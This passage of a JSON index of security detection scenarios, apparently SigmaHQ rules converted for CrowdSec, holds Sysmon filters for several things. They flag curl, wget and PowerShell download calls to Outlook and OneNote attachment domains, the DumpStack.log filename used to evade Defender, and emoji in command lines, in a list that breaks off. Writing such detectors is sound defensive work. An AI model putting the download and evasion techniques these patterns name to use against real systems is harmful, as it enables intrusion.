{"digest": "f3f301e8123ed6c4eae2c51316bfc3fc49089ed092c80039c487204410ef1662"}}}, "sigmahq/proc_creation_win_susp_download_office_domain": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_download_office_domain\ndescription: |\n  Detects suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\curl.exe' || evt.Parsed.Image endsWith '\\\\wget.exe' || evt.Parsed.CommandLine contains 'Invoke-WebRequest' || evt.Parsed.CommandLine contains 'iwr ' || evt.Parsed.CommandLine contains 'curl ' || evt.Parsed.CommandLine contains 'wget ' || evt.Parsed.CommandLine contains 'Start-BitsTransfer' || evt.Parsed.CommandLine contains '.DownloadFile(' || evt.Parsed.CommandLine contains '.DownloadString(') && (evt.Parsed.CommandLine contains 'https://attachment.outlook.live.net/owa/' || evt.Parsed.CommandLine contains 'https://onenoteonlinesync.onenote.com/onenoteonlinesync/'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1105\n   - attack.t1608\n\n  label: \"Suspicious Download from Office Domain\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents\n", "path": "scenarios/sigmahq/proc_creation_win_susp_download_office_domain.yml", "version": "0.2", "versions": {"0.1": {"digest": "ed6b13526bbae52a96b5c075a252fa17b77646480109d751a70b9a68cd74b534"}, "0.2": {"digest": "9df929fdafc0f926f6d1700d66c3a4aec1f654394b616960465e78d5964fcf7c"}}}, "sigmahq/proc_creation_win_susp_dumpstack_log_evasion": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_dumpstack_log_evasion\ndescription: |\n  Detects the use of the filename DumpStack.log to evade Microsoft Defender\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\DumpStack.log' || evt.Parsed.CommandLine contains ' -o DumpStack.log')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"DumpStack.log Defender Evasion\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of the filename DumpStack.log to evade Microsoft Defender\n", "path": "scenarios/sigmahq/proc_creation_win_susp_dumpstack_log_evasion.yml", "version": "0.2", "versions": {"0.1": {"digest": "e1a90f237d18b6b3ee40250f769715fb5b409e4a9c8d0e3e8f4f171485c3a7d4"}, "0.2": {"digest": "80cf9491bd22cf98f0643817f0fc4d6fecc8402102482dbc7324f7bea1833d2b"}}}, "sigmahq/proc_creation_win_susp_emoji_usage_in_cli_1": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_emoji_usage_in_cli_1\ndescription: |\n  Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\ud83d\ude00' || evt.Parsed.CommandLine contains '\ud83d\ude03' || evt.Parsed.CommandLine contains '\ud83d\ude04' || evt.Parsed.CommandLine contains '\ud83d\ude01' || evt.Parsed.CommandLine contains '\ud83d\ude06' || evt.Parsed.CommandLine contains '\ud83d\ude05' || evt.Parsed.CommandLine contains '\ud83d\ude02' || evt.Parsed.CommandLine contains '\ud83e\udd23' || evt.Parsed.CommandLine contains '\ud83e\udd72' || evt.Parsed.CommandLine contains '\ud83e\udd79' || evt.Parsed.CommandLine contains '\u263a\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude0a' || evt.Parsed.CommandLine contains '\ud83d\ude07' || evt.Parsed.CommandLine contains '\ud83d\ude42' || evt.Parsed.CommandLine contains '\ud83d\ude43' || evt.Parsed.CommandLine contains '\ud83d\ude09' || evt.Parsed.CommandLine contains '\ud83d\ude0c' || evt.Parsed.CommandLine contains '\ud83d\ude0d' || evt.Parsed.CommandLine contains '\ud83e\udd70' || evt.Parsed.CommandLine contains '\ud83d\ude18' || evt.Parsed.CommandLine contains '\ud83d\ude17' || evt.Parsed.CommandLine contains '\ud83d\ude19' || evt.Parsed.CommandLine contains '\ud83d\ude1a' || evt.Parsed.CommandLine contains '\ud83d\ude0b' || evt.Parsed.CommandLine contains '\ud83d\ude1b' || evt.Parsed.CommandLine contains '\ud83d\ude1d' || evt.Parsed.CommandLine contains '\ud83d\ude1c' || evt.Parsed.CommandLine contains '\ud83e\udd2a' || evt.Parsed.CommandLine contains '\ud83e\udd28' || evt.Parsed.CommandLine contains '\ud83e\uddd0' || evt.Parsed.CommandLine contains '\ud83e\udd13' || evt.Parsed.CommandLine contains '\ud83d\ude0e' || evt.Parsed.CommandLine contains '\ud83e\udd78' || evt.Parsed.CommandLine contains '\ud83e\udd29' || evt.Parsed.CommandLine contains '\ud83e\udd73' || evt.Parsed.CommandLine contains '\ud83d\ude0f' || evt.Parsed.CommandLine contains '\ud83d\ude12' || evt.Parsed.CommandLine contains '\ud83d\ude1e' || evt.Parsed.CommandLine contains '\ud83d\ude14' || evt.Parsed.CommandLine contains '\ud83d\ude1f' || evt.Parsed.CommandLine contains '\ud83d\ude15' || evt.Parsed.CommandLine contains '\ud83d\ude41' || evt.Parsed.CommandLine contains '\u2639\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude23' || evt.Parsed.CommandLine contains '\ud83d\ude16' || evt.Parsed.CommandLine contains '\ud83d\ude2b' || evt.Parsed.CommandLine contains '\ud83d\ude29' || evt.Parsed.CommandLine contains '\ud83e\udd7a' || evt.Parsed.CommandLine contains '\ud83d\ude22' || evt.Parsed.CommandLine contains '\ud83d\ude2d' || evt.Parsed.CommandLine contains '\ud83d\ude2e\u200d\ud83d\udca8' || evt.Parsed.CommandLine contains '\ud83d\ude24' || evt.Parsed.CommandLine contains '\ud83d\ude20' || evt.Parsed.CommandLine contains '\ud83d\ude21' || evt.Parsed.CommandLine contains '\ud83e\udd2c' || evt.Parsed.CommandLine contains '\ud83e\udd2f' || evt.Parsed.CommandLine contains '\ud83d\ude33' || evt.Parsed.CommandLine contains '\ud83e\udd75' || evt.Parsed.CommandLine contains '\ud83e\udd76' || evt.Parsed.CommandLine contains '\ud83d\ude31' || evt.Parsed.CommandLine contains '\ud83d\ude28' || evt.Parsed.CommandLine contains '\ud83d\ude30' || evt.Parsed.CommandLine contains '\ud83d\ude25' || evt.Parsed.CommandLine contains '\ud83d\ude13' || evt.Parsed.CommandLine contains '\ud83e\udee3' || evt.Parsed.CommandLine contains '\ud83e\udd17' || evt.Parsed.CommandLine contains '\ud83e\udee1' || evt.Parsed.CommandLine contains '\ud83e\udd14' || evt.Parsed.CommandLine contains '\ud83e\udee2' || evt.Parsed.CommandLine contains '\ud83e\udd2d' || evt.Parsed.CommandLine contains '\ud83e\udd2b' || evt.Parsed.CommandLine contains '\ud83e\udd25' || evt.Parsed.CommandLine contains '\ud83d\ude36' || evt.Parsed.CommandLine contains '\ud83d\ude36\u200d\ud83c\udf2b\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude10' || evt.Parsed.CommandLine contains '\ud83d\ude11' || evt.Parsed.CommandLine contains '\ud83d\ude2c' || evt.Parsed.CommandLine contains '\ud83e\udee0' || evt.Parsed.CommandLine contains '\ud83d\ude44' || evt.Parsed.CommandLine contains '\ud83d\ude2f' || evt.Parsed.CommandLine contains '\ud83d\ude26' || evt.Parsed.CommandLine contains '\ud83d\ude27' || evt.Parsed.CommandLine contains '\ud83d\ude2e' || evt.Parsed.CommandLine contains '\ud83d\ude32' || evt.Parsed.CommandLine contains '\ud83e\udd71' || evt.Parsed.CommandLine contains '\ud83d\ude34' || evt.Parsed.CommandLine contains '\ud83e\udd24' || evt.Parsed.CommandLine contains '\ud83d\ude2a' || evt.Parsed.CommandLine contains '\ud83d\ude35' || evt.Parsed.CommandLine contains '\ud83d\ude35\u200d\ud83d\udcab' || evt.Parsed.CommandLine contains '\ud83e\udee5' || evt.Parsed.CommandLine contains '\ud83e\udd10' || evt.Parsed.CommandLine contains '\ud83e\udd74' || evt.Parsed.CommandLine contains '\ud83e\udd22' || evt.Parsed.CommandLine contains '\ud83e\udd2e' || evt.Parsed.CommandLine contains '\ud83e\udd27' || evt.Parsed.CommandLine contains '\ud83d\ude37' || evt.Parsed.CommandLine contains '\ud83e\udd12' || evt.Parsed.CommandLine contains '\ud83e\udd15' || evt.Parsed.CommandLine contains '\ud83e\udd11' || evt.Parsed.CommandLine contains '\ud83e\udd20' || evt.Parsed.CommandLine contains '\ud83d\ude08' || evt.Parsed.CommandLine contains '\ud83d\udc7f' || evt.Parsed.CommandLine contains '\ud83d\udc79' || evt.Parsed.CommandLine contains '\ud83d\udc7a' || evt.Parsed.CommandLine contains '\ud83e\udd21' || evt.Parsed.CommandLine contains '\ud83d\udca9' || evt.Parsed.CommandLine contains '\ud83d\udc7b' || evt.Parsed.CommandLine contains '\ud83d\udc80' || evt.Parsed.CommandLine contains '\u2620\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc7d' || evt.Parsed.CommandLine contains '\ud83d\udc7e' || evt.Parsed.CommandLine contains '\ud83e\udd16' || evt.Parsed.CommandLine contains '\ud83c\udf83' || evt.Parsed.CommandLine contains '\ud83d\ude3a' || evt.Parsed.CommandLine contains '\ud83d\ude38' || evt.Parsed.CommandLine contains '\ud83d\ude39' || evt.Parsed.CommandLine contains '\ud83d\ude3b' || evt.Parsed.CommandLine contains '\ud83d\ude3c' || evt.Parsed.CommandLine contains '\ud83d\ude3d' || evt.Parsed.CommandLine contains '\ud83d\ude40' || evt.Parsed.CommandLine contains '\ud83d\ude3f' || evt.Parsed.CommandLine contains '\ud83d\ude3e' || evt.Parsed.CommandLine contains '\ud83d\udc4b' || evt.Parsed.CommandLine contains '\ud83e\udd1a' || evt.Parsed.CommandLine contains '\ud83d\udd90' || evt.Parsed.CommandLine contains '\u270b' || evt.Parsed.CommandLine contains '\ud83d\udd96' || evt.Parsed.CommandLine contains '\ud83d\udc4c' || evt.Parsed.CommandLine contains '\ud83e\udd0c' || evt.Parsed.CommandLine contains '\ud83e\udd0f' || evt.Parsed.CommandLine contains '\u270c\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd1e' || evt.Parsed.CommandLine contains '\ud83e\udef0' || evt.Parsed.CommandLine contains '\ud83e\udd1f' || evt.Parsed.CommandLine contains '\ud83e\udd18' || evt.Parsed.CommandLine contains '\ud83e\udd19' || evt.Parsed.CommandLine contains '\ud83e\udef5' || evt.Parsed.CommandLine contains '\ud83e\udef1' || evt.Parsed.CommandLine contains '\ud83e\udef2' || evt.Parsed.CommandLine contains '\ud83e\udef3' || evt.Parsed.CommandLine contains '\ud83e\udef4' || evt.Parsed.CommandLine contains '\ud83d\udc48' || evt.Parsed.CommandLine contains '\ud83d\udc49' || evt.Parsed.CommandLine contains '\ud83d\udc46' || evt.Parsed.CommandLine contains '\ud83d\udd95' || evt.Parsed.CommandLine contains '\ud83d\udc47' || evt.Parsed.CommandLine contains '\u261d\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc4d' || evt.Parsed.CommandLine contains '\ud83d\udc4e' || evt.Parsed.CommandLine contains '\u270a' || evt.Parsed.CommandLine contains '\ud83d\udc4a' || evt.Parsed.CommandLine contains '\ud83e\udd1b' || evt.Parsed.CommandLine contains '\ud83e\udd1c' || evt.Parsed.CommandLine contains '\ud83d\udc4f' || evt.Parsed.CommandLine contains '\ud83e\udef6' || evt.Parsed.CommandLine contains '\ud83d\ude4c' || evt.Parsed.CommandLine contains '\ud83d\udc50' || evt.Parsed.CommandLine contains '\ud83e\udd32' || evt.Parsed.CommandLine contains '\ud83e\udd1d' || evt.Parsed.CommandLine contains '\ud83d\ude4f' || evt.Parsed.CommandLine contains '\u270d\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udcaa' || evt.Parsed.CommandLine contains '\ud83e\uddbe' || evt.Parsed.CommandLine contains '\ud83e\uddb5' || evt.Parsed.CommandLine contains '\ud83e\uddbf' || evt.Parsed.CommandLine contains '\ud83e\uddb6' || evt.Parsed.CommandLine contains '\ud83d\udc63' || evt.Parsed.CommandLine contains '\ud83d\udc42' || evt.Parsed.CommandLine contains '\ud83e\uddbb' || evt.Parsed.CommandLine contains '\ud83d\udc43' || evt.Parsed.CommandLine contains '\ud83e\udec0' || evt.Parsed.CommandLine contains '\ud83e\udec1' || evt.Parsed.CommandLine contains '\ud83e\udde0' || evt.Parsed.CommandLine contains '\ud83e\uddb7' || evt.Parsed.CommandLine contains '\ud83e\uddb4' || evt.Parsed.CommandLine contains '\ud83d\udc40' || evt.Parsed.CommandLine contains '\ud83d\udc41' || evt.Parsed.CommandLine contains '\ud83d\udc45' || evt.Parsed.CommandLine contains '\ud83d\udc44' || evt.Parsed.CommandLine contains '\ud83e\udee6' || evt.Parsed.CommandLine contains '\ud83d\udc8b' || evt.Parsed.CommandLine contains '\ud83e\ude78' || evt.Parsed.CommandLine contains '\ud83d\udc76' || evt.Parsed.CommandLine contains '\ud83d\udc67' || evt.Parsed.CommandLine contains '\ud83e\uddd2' || evt.Parsed.CommandLine contains '\ud83d\udc66' || evt.Parsed.CommandLine contains '\ud83d\udc69' || evt.Parsed.CommandLine contains '\ud83e\uddd1' || evt.Parsed.CommandLine contains '\ud83d\udc68' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc71\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc71' || evt.Parsed.CommandLine contains '\ud83d\udc71\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd4\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4' || evt.Parsed.CommandLine contains '\ud83e\uddd4\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc75' || evt.Parsed.CommandLine contains '\ud83e\uddd3' || evt.Parsed.CommandLine contains '\ud83d\udc74' || evt.Parsed.CommandLine contains '\ud83d\udc72' || evt.Parsed.CommandLine contains '\ud83d\udc73\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc73' || evt.Parsed.CommandLine contains '\ud83d\udc73\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd5' || evt.Parsed.CommandLine contains '\ud83d\udc6e\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6e' || evt.Parsed.CommandLine contains '\ud83d\udc6e\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77' || evt.Parsed.CommandLine contains '\ud83d\udc77\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82' || evt.Parsed.CommandLine contains '\ud83d\udc82\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ufe0f\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ufe0f\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70' || evt.Parsed.CommandLine contains '\ud83d\udc70\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35' || evt.Parsed.CommandLine contains '\ud83e\udd35\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc78' || evt.Parsed.CommandLine contains '\ud83e\udec5' || evt.Parsed.CommandLine contains '\ud83e\udd34' || evt.Parsed.CommandLine contains '\ud83e\udd77' || evt.Parsed.CommandLine contains '\ud83e\uddb8\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb8' || evt.Parsed.CommandLine contains '\ud83e\uddb8\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9' || evt.Parsed.CommandLine contains '\ud83e\uddb9\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd36' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udf84' || evt.Parsed.CommandLine contains '\ud83c\udf85' || evt.Parsed.CommandLine contains '\ud83e\uddd9\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd9' || evt.Parsed.CommandLine contains '\ud83e\uddd9\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd' || evt.Parsed.CommandLine contains '\ud83e\udddd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb' || evt.Parsed.CommandLine contains '\ud83e\udddb\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddf\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddf' || evt.Parsed.CommandLine contains '\ud83e\udddf\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddde\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddde' || evt.Parsed.CommandLine contains '\ud83e\uddde\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc' || evt.Parsed.CommandLine contains '\ud83e\udddc\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda' || evt.Parsed.CommandLine contains '\ud83e\uddda\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcc' || evt.Parsed.CommandLine contains '\ud83d\udc7c' || evt.Parsed.CommandLine contains '\ud83e\udd30' || evt.Parsed.CommandLine contains '\ud83e\udec4' || evt.Parsed.CommandLine contains '\ud83e\udec3' || evt.Parsed.CommandLine contains '\ud83e\udd31' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\ude47\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude47' || evt.Parsed.CommandLine contains '\ud83d\ude47\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81' || evt.Parsed.CommandLine contains '\ud83d\udc81\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45' || evt.Parsed.CommandLine contains '\ud83d\ude45\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46' || evt.Parsed.CommandLine contains '\ud83d\ude46\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b' || evt.Parsed.CommandLine contains '\ud83d\ude4b\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf' || evt.Parsed.CommandLine contains '\ud83e\uddcf\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26' || evt.Parsed.CommandLine contains '\ud83e\udd26\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37' || evt.Parsed.CommandLine contains '\ud83e\udd37\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e' || evt.Parsed.CommandLine contains '\ud83d\ude4e\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d' || evt.Parsed.CommandLine contains '\ud83d\ude4d\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87' || evt.Parsed.CommandLine contains '\ud83d\udc87\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86' || evt.Parsed.CommandLine contains '\ud83d\udc86\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6' || evt.Parsed.CommandLine contains '\ud83e\uddd6\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc85' || evt.Parsed.CommandLine contains '\ud83d\udc83' || evt.Parsed.CommandLine contains '\ud83d\udd7a' || evt.Parsed.CommandLine contains '\ud83d\udc6f\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6f' || evt.Parsed.CommandLine contains '\ud83d\udc6f\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd74' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udeb6\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb6' || evt.Parsed.CommandLine contains '\ud83d\udeb6\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddce\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddce' || evt.Parsed.CommandLine contains '\ud83e\uddce\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3' || evt.Parsed.CommandLine contains '\ud83c\udfc3\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd' || evt.Parsed.CommandLine contains '\ud83e\uddcd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6d' || evt.Parsed.CommandLine contains '\ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1' || evt.Parsed.CommandLine contains '\ud83d\udc6c' || evt.Parsed.CommandLine contains '\ud83d\udc6b' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc69' || evt.Parsed.CommandLine contains '\ud83d\udc91' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc68' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69' || evt.Parsed.CommandLine contains '\ud83d\udc8f' || evt.Parsed.CommandLine contains '\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68' || evt.Parsed.CommandLine contains '\ud83d\udc69\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68' || evt.Parsed.CommandLine contains 